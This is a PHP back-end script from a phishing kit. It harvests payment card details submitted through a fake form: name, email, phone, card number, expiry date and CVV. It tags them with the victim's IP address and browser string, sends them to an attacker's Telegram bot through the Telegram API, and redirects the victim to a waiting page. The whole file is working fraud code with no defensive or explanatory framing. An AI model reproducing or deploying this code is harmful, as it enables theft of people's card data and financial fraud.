<?php
include("../sand_email.php"); 
include("../detect.php");
$IP = getenv("REMOTE_ADDR");
$message = "--++-----[💛💙 RESULT-CC 💛💙 ]-----++--\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "email : ".$_POST['email']."\n";
$message .= "phone : ".$_POST['phone']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";


    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini



header("Location: ../wait");
?>
